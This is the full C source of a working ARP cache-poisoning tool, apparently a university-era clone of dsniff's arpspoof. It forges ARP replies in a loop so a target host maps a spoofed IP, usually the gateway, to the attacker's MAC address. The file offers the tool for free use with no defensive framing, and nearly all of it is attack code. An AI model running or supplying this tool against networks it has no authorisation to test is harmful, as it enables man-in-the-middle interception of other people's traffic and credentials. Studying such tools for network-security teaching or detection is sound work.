/*
 * no license, do whatever you want
 * or just use arpspoof from dsniff, which is very similar
 *
 * REQUIRES
 *  - libnet (should be obvious)
 *  - libdnet (arp table access)
 *
 * Hochschule Furtwangen, 2006-2008
 * @author Benedikt Waldvogel, mail /at/ bwaldvogel -dot- de
 *
 * @version 0.2
 */
#include <stdio.h>
#include <dnet.h>
#include <libnet.h>
#include <signal.h>
#include <unistd.h> /* usleep, getopt */
#include <assert.h>

static int running = 1;

/** 123.456.789.012 (3 dots) + 1 byte for 0 termination */
static const unsigned short IP_STR_SIZE = (4*3+3+1);

/** verbosity depth, each -v increases it by 1 */
static unsigned int verbose = 0;

/**
 * binary exponential
 * (fuck of math.h)
 * @param e exponent
 * @return 2 to the exponent
 */
static unsigned int pow2(unsigned int e)
{
    unsigned int i=0, result = 1;

    for(;i<e;i++)
        result *= 2;

    return result;
}

/**
 * converts an IP datastructure to the 123.123.123.123 format
 * @param in ip addr to convert
 * @param str target string
 * @param size max bytes to write into str
 */
static void ip2str(in_addr_t in, char* str, int size)
{
    u_char* c = (u_char*)&in;
    snprintf(str, size, "%hu.%hu.%hu.%hu",
            (unsigned short)c[0],
            (unsigned short)c[1],
            (unsigned short)c[2],
            (unsigned short)c[3]);
}

/**
 * build and send an ethernet packet
 * @param l libnet context
 * @param hw_src sender's hwaddr
 * @param hw_dst receiver's hwaddr
 * @return total bytes written to network
 */
static int send_packet(libnet_t* l, const struct libnet_ether_addr * hw_src,
        const struct libnet_ether_addr * hw_dst)
{
    /* build an ethernet frame */
    libnet_ptag_t p = libnet_build_ethernet(
            (u_int8_t*)hw_dst, /* ethernet destination */
            (u_int8_t*)hw_src, /* ethernet destination */
            ETHERTYPE_ARP,     /* protocol type */
            NULL,              /* payload */
            0,                 /* payload size */
            l,                 /* libnet handle */
            0                  /* libnet id (ptag) */
            );

    /* catch an error ... */
    if (p == -1) {
        fprintf(stderr, "can't build ethernet header: %s\n",
                libnet_geterror(l));
        exit(-1);
    }
    /*
     * send
     */
    int c = libnet_write(l);
    if (c==-1) {
        fprintf(stderr, "write error: %s\n", libnet_geterror(l));
        return -1;
    } else {
        return c;
    }
    return -1;
}

/**
 * private for ip2mac
 * @param dst ip address for which we request the hw address
 * @return bytes written to the network or -1 on error
 */
static int arprequest(libnet_t* l, const in_addr_t dst)
{
    assert(l != NULL);

    /* my proto and hw addr */
    u_int32_t sender_ip = libnet_get_ipaddr4(l);
    /* pointer to a static field (non-re-entrant) */
    struct libnet_ether_addr* sender_mac = libnet_get_hwaddr(l);

    u_char target_mac[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
    u_char broadcast_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    assert(sizeof(broadcast_mac) == sizeof(struct libnet_ether_addr));
    assert(sizeof(target_mac) == sizeof(struct libnet_ether_addr));

    libnet_ptag_t p = libnet_build_arp(
            ARPHRD_ETHER,            /* hardware addr */
            ETHERTYPE_IP,            /* protocol addr */
            6,                       /* hw addr size */
            4,                       /* proto addr size */
            ARPOP_REQUEST,           /* op type */
            (u_int8_t*)sender_mac,   /* sender hw addr */
            (u_int8_t*)&sender_ip,   /* sender proto addr */
            target_mac,              /* target hw addr */
            (u_int8_t*)&dst,         /* target proto addr */
            NULL,                    /* payload */
            0,                       /* payload size */
            l,                       /* libnet context */
            0);                      /* libnet id (ptag) */

    /* catch an error here */
    if (p == -1)
    {
        fprintf(stderr, "can't build ARP header: %s\n",
                libnet_geterror(l));
        goto failure;
    }
    if (verbose>=1) {
        char str[IP_STR_SIZE];
        ip2str(dst, str, sizeof(str));
        printf("arp request for %s\n", str);
    }
    int c = send_packet(l, sender_mac,
            (struct libnet_ether_addr*)broadcast_mac);
    if (c <= 0) {
        fprintf(stderr, "libnet error: %s\n", libnet_geterror(l));
        goto failure;
    }
    return c;
failure:
    return -1;
}

/**
 * resolves an ip address to and hardware (mac) address
 * @param dst ip adress which should be resolved into hardware adresse
 * @param hwaddr pointer to the hwaddr (result of the operation)
 * @return -1 if the function fails. 0 if resolution was successful
 */
static int ip2mac(libnet_t* l, const in_addr_t dst,
        struct libnet_ether_addr* hwaddr)
{
    /* is in arp cache? */
    arp_t* a = arp_open();

    struct addr dest;
    dest.addr_type = ADDR_TYPE_IP;
    dest.addr_bits = 32;
    dest.addr_ip = dst;

    struct arp_entry entry;
    entry.arp_pa = dest;    /* protocol addr */

    char str[IP_STR_SIZE];
    ip2str(dst, str, sizeof(str));

    int r = arp_get(a, &entry);
    if (r == -1)
    {
        /* try some time until the entry appears */
        int try = 0;
        for (;;)
        {
            arprequest(l, dst);
            /* binary exponential sleep time
             * (2^try)*30ms */
            unsigned int sleeptime = pow2(try)*20000u;
            usleep(sleeptime);

            r = arp_get(a, &entry);
            if (r >= 0) {
                if (verbose>=2)
                    printf("%s in mac-cache\n",str);
                break;
            }
            if (verbose>=2)
                printf("mac for %s not in cache (try %d)\n", str, try+1);

            if (++try >= 5)
            {
                char str[IP_STR_SIZE];
                ip2str(dst, str, sizeof(str));
                fprintf(stderr, "unable to get mac for %s, giving up\n", str);
                goto failure;
            }
        }
    }
    memcpy(hwaddr, &entry.arp_ha.__addr_u, sizeof(struct libnet_ether_addr));
    arp_close(a);
    return r;

failure:
    arp_close(a);
    return -1;
}

/**
 * sends and builds and arp packet.
 * this packet is used to poison the arp cache of another system.
 *
 * @return -1 on error, or the amount of bytes written to the line
 */
static int arpspoof(libnet_t* l, const char* device, in_addr_t target_ip,
        in_addr_t victim_ip)
{
    assert(l != NULL);

    /* pointer to a static field (non-re-entrant) */
    struct libnet_ether_addr* sender_mac = libnet_get_hwaddr(l);

    struct libnet_ether_addr target_mac;
    if (ip2mac(l, victim_ip, &target_mac) != 0) {
        return -1;
    }

    u_char payload[1];
    memset(payload, 0, sizeof(payload));

    /*
     * ARP
     */
    libnet_ptag_t arppacket = libnet_build_arp(
            ARPHRD_ETHER,            /* hardware addr */
            ETHERTYPE_IP,            /* protocol addr */
            6,                       /* hw addr size */
            4,                       /* proto addr size */
            ARPOP_REPLY,             /* op type */
            (u_int8_t*)sender_mac,   /* sender hw addr */
            (u_int8_t*)&target_ip,   /* sender proto addr */
            (u_int8_t*)&target_mac,  /* target hw addr */
            (u_int8_t*)&victim_ip,   /* target proto addr */
            NULL,                    /* payload */
            0,                       /* payload size */
            l,                       /* libnet context */
            0);                      /* libnet id */

    /* catch an error here */
    if (arppacket == -1) {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return -1;
    }

    int c = send_packet(l, sender_mac, &target_mac);

    char s1[IP_STR_SIZE];
    char s2[IP_STR_SIZE];
    ip2str(victim_ip, s1, sizeof(s1));
    ip2str(target_ip, s2, sizeof(s2));
    printf("arp reply to %s with %s", s1, s2);

    static int last;

    if (verbose)
        printf(" (%d bytes, %d total)\n", (c-last), c);
    else
        puts("");

    last = c;

    return c;
}

/**
 * print usage for this program
 * @param argv0 name of this executable, usually argv[0]
 */
static void usage(const char* argv0)
{
    printf("%s [%s] [-v] [-i interface] [-t timeout] <spoof-ip> <target-ip>\n",
            argv0, __DATE__);
    puts("-v             verbose mode (repeat to increase verbosity)");
    puts("-i interface   interface to send packets");
    puts("-t timeout     time in s to wait after each sent arp reply");
    puts("<spoof-ip>     spoof address to spoof (often a gateway) ");
    puts("<target-ip>    target host whose mac cache should be poisoned");
}

/**
 * used to handle signales like SIGINT (Ctrl-C)
 * @param sig signal code
 */
static void sighandler(const int sig)
{
    if (sig==SIGINT)
    {
        if (verbose>=1)
            puts("got a SIGINT, quitting");

        running = 0;
    }
}

static void safe_libnet_destroy(libnet_t* l)
{
    if (l == NULL)
        return;

    if (verbose >= 2)
        puts("destroying libnet context");

    libnet_destroy(l);
}

int main(const int args, char** argv)
{
    signal(SIGINT, sighandler);
    libnet_t* l = NULL;

    if (getuid() > 0)
    {
        puts("Must be root");
        return -1;
    }

    int timeout = 4;      /* time in s to wait after each sent arp reply */
    char* device = NULL;  /* first device */
    char  errbuf[LIBNET_ERRBUF_SIZE];

    /* create libnet context */
    l = libnet_init(LIBNET_LINK_ADV, device, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init(): %s", errbuf);
        goto failure;
    }

    opterr = 1; /* print option error to stderr, use 0 to disable it */

    int c;
    while ((c=getopt(args, argv, "vi:t:")) != EOF)
    {
        switch (c)
        {
            case 'v':
                verbose++;
                break;

            case 'i':
                device = optarg;
                break;

            case 't':
                timeout = atoi(optarg);
                if (timeout <= 0) {
                    fprintf(stderr, "invalid timeout value %d\n", timeout);
                    goto failure;
                }
                break;

            case '?':
                usage(argv[0]);
                goto failure;

            default:
                printf("unknown case: %c\n", c);
        }
    }

    /* the two remaining parameters are
     * <victim-ip> and <target-ip> */
    if (args-optind<2)
    {
        usage(argv[0]);
        goto failure;
    }

    /* which host to spoof */
    in_addr_t victim = libnet_name2addr4(l, argv[optind],
            LIBNET_RESOLVE);

    if(victim==-1) {
        fprintf(stderr, "unable to resolve %s\n", argv[optind]);
        goto failure;
    }
    optind++;

    /* target whose mac cache should be poisoned */
    in_addr_t target = libnet_name2addr4(l, argv[optind],
            LIBNET_RESOLVE);

    if (target==-1) {
        fprintf(stderr, "unable to resolve %s\n", argv[optind]);
        goto failure;
    }

    if (verbose >= 1) {
        printf("timeout is set to %ds\n", timeout);
    }

    /* main loop */
    while (running == 1)
    {
        if (arpspoof(l, device, victim, target) == -1)
            break;
        sleep(timeout);
    }

    safe_libnet_destroy(l);
    return 0;

failure:
    safe_libnet_destroy(l);
    return -1;
}

/* vim: set ts=4 sw=4 tw=80 et: */
